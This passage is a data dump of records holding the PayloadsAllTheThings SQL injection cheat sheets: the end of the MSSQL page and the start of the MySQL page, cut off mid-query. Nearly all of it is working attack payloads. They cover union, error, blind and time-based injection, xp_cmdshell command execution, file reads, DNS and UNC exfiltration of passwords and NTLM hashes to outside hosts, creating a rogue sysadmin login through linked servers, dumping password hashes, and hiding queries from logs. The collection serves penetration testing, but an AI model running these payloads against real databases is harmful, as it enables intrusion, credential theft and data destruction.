MSreplication_options  (Only works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';\n```\n\n### MSSQL List Columns\n\n```sql\n-- for the current DB only\nSELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');\n\n-- list column names and types for master..sometable\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; \n\nSELECT table_catalog, column_name FROM information_schema.columns\n\nSELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)\n```\n\n## MSSQL Union Based\n\n* Extract databases names\n\n    ```sql\n    $ SELECT name FROM master..sysdatabases\n    [*] Injection\n    [*] msdb\n    [*] tempdb\n    ```\n\n* Extract tables from Injection database\n\n    ```sql\n    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n    [*] Profiles\n    [*] Roles\n    [*] Users\n    ```\n\n* Extract columns for the table Users\n\n    ```sql\n    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n    [*] UserId\n    [*] UserName\n    ```\n\n* Finally extract the data\n\n    ```sql\n    SELECT  UserId, UserName from Users\n    ```\n\n## MSSQL Error Based\n\n| Name         | Payload         |\n| ------------ | --------------- |\n| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |\n| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |\n| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |\n| CAST         | `CAST((SELECT @@version) AS INT)` |\n\n* For integer inputs\n\n    ```sql\n    convert(int,@@version)\n    cast((SELECT @@version) as int)\n    ```\n\n* For string inputs\n\n    ```sql\n    ' + convert(int,@@version) + '\n    ' + cast((SELECT @@version) as int) + '\n    ```\n\n## MSSQL Blind Based\n\n```sql\nAND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\n```\n\n```sql\nSELECT @@version WHERE @@version LIKE '%12.0.2000.8%'\nWITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)\nSELECT message FROM data WHERE row = 1 and message like 't%'\n```\n\n### MSSQL Blind With Substring Equivalent\n\n| Function    | Example                                         |\n| ----------- | ----------------------------------------------- |\n| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |\n\nExamples:\n\n```sql\nAND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'\nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90\n```\n\n## MSSQL Time Based\n\nIn a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.\n\n```sql\nProductID=1;waitfor delay '0:0:10'--\nProductID=1);waitfor delay '0:0:10'--\nProductID=1';waitfor delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\nProductID=1));waitfor delay '0:0:10'--\n```\n\n```sql\nIF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'\nIF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';\n```\n\n## MSSQL Stacked Query\n\n* Stacked query without any statement terminator\n\n    ```sql\n    -- multiple SELECT statements\n    SELECT 'A'SELECT 'B'SELECT 'C'\n\n    -- updating password with a stacked query\n    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--\n\n    -- using the stacked query to enable xp_cmdshell\n    -- you won't have the output of the query, redirect it to a file \n    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--\n    ```\n\n* Use a semi-colon \"`;`\" to add another query\n\n    ```sql\n    ProductID=1; DROP members--\n    ```\n\n## MSSQL File Manipulation\n\n### MSSQL Read File\n\n**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.\n\n```sql\nOPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)\n```\n\nExample:\n\n```sql\n-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null\n```\n\n### MSSQL Write File\n\n```sql\nexecute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'\n```\n\n## MSSQL Command Execution\n\n### XP_CMDSHELL\n\n`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).\n\n```sql\nEXEC xp_cmdshell \"net user\";\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n```\n\nIf you need to reactivate `xp_cmdshell`, it is disabled by default in SQL Server 2005.\n\n```sql\n-- Enable advanced options\nEXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\n\n-- Enable xp_cmdshell\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n```\n\n### Python Script\n\n> Executed by a different user than the one using `xp_cmdshell` to execute commands\n\n```powershell\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n```\n\n## MSSQL Out of Band\n\n### MSSQL DNS exfiltration\n\nTechnique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)\n\n* **Permission**: Requires `VIEW SERVER STATE` permission on the server.\n\n    ```powershell\n    1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))\n    ```\n\n* **Permission**: Requires the `CONTROL SERVER` permission.\n\n    ```powershell\n    1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))\n    1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))\n    ```\n\n### MSSQL UNC Path\n\nMSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.\n\n```sql\n1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- \n```\n\n```sql\nxp_dirtree '\\\\attackerip\\file'\nxp_fileexist '\\\\attackerip\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'\nRESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'\n```\n\n## MSSQL Trusted Links\n\n> The links between databases work even across forest trusts.\n\n```powershell\nmsf> use exploit/windows/mssql/mssql_linkcrawler\n[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session\n```\n\nManual exploitation\n\n```sql\n-- find link\nselect * from master..sysservers\n\n-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n```\n\n## MSSQL Privileges\n\n### MSSQL List Permissions\n\n* Listing effective permissions of current user on the server.\n\n    ```sql\n    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \n    ```\n\n* Listing effective permissions of current user on the database.\n\n    ```sql\n    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n    ```\n\n* Listing effective permissions of current user on a view.\n\n    ```sql\n    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \n    ```\n\n* Check if current user is a member of the specified server role.\n\n    ```sql\n    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin\n    SELECT is_srvrolemember('sysadmin');\n    ```\n\n### MSSQL Make User DBA\n\n```sql\nEXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;\n```\n\n## MSSQL Database Credentials\n\n* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`\n\n    ```sql\n    SELECT name, password FROM master..sysxlogins\n    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer\n    ```\n\n* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`\n\n    ```sql\n    SELECT name, password_hash FROM master.sys.sql_logins\n    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n    ```\n\n## MSSQL OPSEC\n\nUse `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`\n\n```sql\n-- 'sp_password' was found in the text of this event.\n-- The text has been replaced with this comment for security reasons.\n```\n\n## References\n\n* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)\n* [Error based SQL Injection in \"Order By\" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)\n* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)\n* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)\n* [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)\n* [MSSQL Trusted Links - HackTricks - September 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)\n* [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)\n* [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)\n", "timestamp": "2025-10-21T13:30:17.980519"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/MySQL Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md", "content": "# MySQL Injection\n\n> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.\n\n## Summary\n\n* [MYSQL Default Databases](#mysql-default-databases)\n* [MYSQL Comments](#mysql-comments)\n* [MYSQL Testing Injection](#mysql-testing-injection)\n* [MYSQL Union Based](#mysql-union-based)\n    * [Detect Columns Number](#detect-columns-number)\n        * [Iterative NULL Method](#iterative-null-method)\n        * [ORDER BY Method](#order-by-method)\n        * [LIMIT INTO Method](#limit-into-method)\n    * [Extract Database With Information_schema](#extract-database-with-information_schema)\n    * [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)\n    * [Extract Data Without Columns Name](#extract-data-without-columns-name)\n* [MYSQL Error Based](#mysql-error-based)\n    * [MYSQL Error Based - Basic](#mysql-error-based---basic)\n    * [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)\n    * [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)\n* [MYSQL Blind](#mysql-blind)\n    * [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)\n    * [MYSQL Blind Using A Conditional Statement](#mysql-blind-using-a-conditional-statement)\n    * [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)\n    * [MYSQL Blind With LIKE](#mysql-blind-with-like)\n    * [MySQL Blind With REGEXP](#mysql-blind-with-regexp)\n* [MYSQL Time Based](#mysql-time-based)\n    * [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)\n    * [Using Conditional Statements](#using-conditional-statements)\n* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)\n* [MYSQL Current Queries](#mysql-current-queries)\n* [MYSQL Read Content of a File](#mysql-read-content-of-a-file)\n* [MYSQL Command Execution](#mysql-command-execution)\n    * [WEBSHELL - OUTFILE method](#webshell---outfile-method)\n    * [WEBSHELL - DUMPFILE method](#webshell---dumpfile-method)\n    * [COMMAND - UDF Library](#command---udf-library)\n* [MYSQL INSERT](#mysql-insert)\n* [MYSQL Truncation](#mysql-truncation)\n* [MYSQL Out of Band](#mysql-out-of-band)\n    * [DNS Exfiltration](#dns-exfiltration)\n    * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)\n* [MYSQL WAF Bypass](#mysql-waf-bypass)\n    * [Alternative to Information Schema](#alternative-to-information-schema)\n    * [Alternative to VERSION](#alternative-to-version)\n    * [Alternative to GROUP_CONCAT](#alternative-to-group_concat)\n    * [Scientific Notation](#scientific-notation)\n    * [Conditional Comments](#conditional-comments)\n    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)\n* [References](#references)\n\n## MYSQL Default Databases\n\n| Name               | Description              |\n|--------------------|--------------------------|\n| mysql              | Requires root privileges |\n| information_schema | Available from version 5 and higher |\n\n## MYSQL Comments\n\nMySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.\n\n| Type                       | Description                       |\n|----------------------------|-----------------------------------|\n| `#`                        | Hash comment                      |\n| `/* MYSQL Comment */`      | C-style comment                   |\n| `/*! MYSQL Special SQL */` | Special SQL                       |\n| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |\n| `--`                       | SQL comment                       |\n| `;%00`                     | Nullbyte                          |\n| \\`                         | Backtick                          |\n\n## MYSQL Testing Injection\n\n* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`\n\n    ```ps1\n    ' False\n    '' True\n    \" False\n    \"\" True\n    \\ False\n    \\\\ True\n    ```\n\n* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`\n\n    ```ps1\n    AND 1     True\n    AND 0     False\n    AND true True\n    AND false False\n    1-false     Returns 1 if vulnerable\n    1-true     Returns 0 if vulnerable\n    1*56     Returns 56 if vulnerable\n    1*56     Returns 1 if not vulnerable\n    ```\n\n* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`\n\n    ```ps1\n    ' OR '1\n    ' OR 1 -- -\n    \" OR \"\" = \"\n    \" OR 1 = 1 -- -\n    '='\n    'LIKE'\n    '=0--+\n    ```\n\n## MYSQL Union Based\n\n### Detect Columns Number\n\nTo successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.\n\n#### Iterative NULL Method\n\nSystematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.\n\n```sql\nUNION SELECT NULL;--\nUNION SELECT NULL, NULL;-- \nUNION SELECT NULL, NULL, NULL;-- \n```\n\n#### ORDER BY Method\n\nKeep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.\n\n| ORDER BY        | GROUP BY        | Result |\n| --------------- | --------------- | ------ |\n| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |\n| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |\n| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |\n| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |\n\nSince the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.\nIn the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.\n\nSimilar to the previous method, we can check the number of columns with one request if error showing is enabled.\n\n```sql\nORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'\n```\n\n#### LIMIT INTO Method\n\nThis method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.\n\n| Payload                      | Error           |\n| ---------------------------- | --------------- |\n| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |\n| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |\n| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |\n\nSince the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.\n\n### Extract Database With Information_Schema\n\nThis query retrieves the names of all schemas (databases) on the server.\n\n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata\n```\n\nThis query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).\n\n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER\n```\n\nThis query retrieves the names of all columns in a specified table.\n\n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...\n```\n\nThis query aims to retrieve data from a specific table.\n\n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...\n```\n\n### Extract Columns Name Without Information_Schema\n\nMethod for `MySQL >= 4.1`.\n\n| Payload | Output |\n| --- | --- |\n| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |\n| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |\n\nMethod for `MySQL 5`\n\n| Payload | Output |\n| --- | --- |\n| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |\n| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |\n| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |\n\n### Extract Data Without Columns Name\n\nExtracting data from the 4th column without knowing its name.\n\n```sql\nSELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;\n```\n\nInjection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`\n\n```sql\nMariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title                                                           |\n+-----------+-----------------------------------------------------------------+\n|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+\n```\n\n## MYSQL Error Based\n\n| Name         | Payload         |\n| ------------ | --------------- |\n| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |\n| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |\n| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |\n| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |\n| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |\n| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |\n| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |\n| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |\n\n### MYSQL Error Based - Basic\n\nWorks with `MySQL >= 4.1`\n\n```sql\n(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))\n'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'\n```\n\n### MYSQL Error Based - UpdateXML Function\n\n```sql\nAND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--\n```\n\nShorter to read:\n\n```sql\nUPDATEXML(null,CONCAT(0x0a,version()),null)-- -\nUPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -\n```\n\n### MYSQL Error Based - Extractvalue Function\n\nWorks with `MySQL >= 5.1`\n\n```sql\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--\n```\n\n### MYSQL Error Based - NAME_CONST function (only for constants)\n\nWorks with `MySQL >= 5.0`\n\n```sql\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--\n```\n\n## MYSQL Blind\n\n### MYSQL Blind With Substring Equivalent\n\n| Function | Example | Description |\n| --- | --- | --- |\n| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |\n| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |\n| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |\n| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |\n| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |\n\nExamples of Blind SQL injection using `SUBSTRING` or another equivalent function:\n\n```sql\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51\n```\n\n### MYSQL Blind Using a Conditional Statement\n\n* TRUE: `if @@version starts with a 5`:\n\n    ```sql\n    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n    Response:\n    HTTP/1.1 500 Internal Server Error\n    ```\n\n* FALSE: `if @@version starts with a 4`:\n\n    ```sql\n    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\n    Response:\n    HTTP/1.1 200 OK\n    ```\n\n### MYSQL Blind With MAKE_SET\n\n```sql\nAND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)\n```\n\n### MYSQL Blind With LIKE\n\nIn MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.\n\nWildcard Characters in LIKE:\n\n* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.\n* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.\n\n```sql\nSELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\nSELECT * FROM products WHERE product_name LIKE '%user_input%'\n```\n\n### MySQL Blind with REGEXP\n\nBlind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.\n\n| Payload | Description |\n| --- | --- |\n| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |\n| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |\n| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by \"a\" |\n\n## MYSQL Time Based\n\nThe following SQL codes will delay the output from MySQL.\n\n* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)\n\n    ```sql\n    +BENCHMARK(40000000,SHA1(1337))+\n    '+BENCHMARK(3200,SHA1(1))+'\n    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))\n    ```\n\n* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)\n\n    ```sql\n    RLIKE SLEEP([SLEEPTIME])\n    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR\n    AND SLEEP(10)=0\n    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)\n    ```\n\n### Using SLEEP in a Subselect\n\nExtracting the length of the data.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# \n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#\n```\n\nExtracting the first character.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#\n```\n\nExtracting the second character.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE 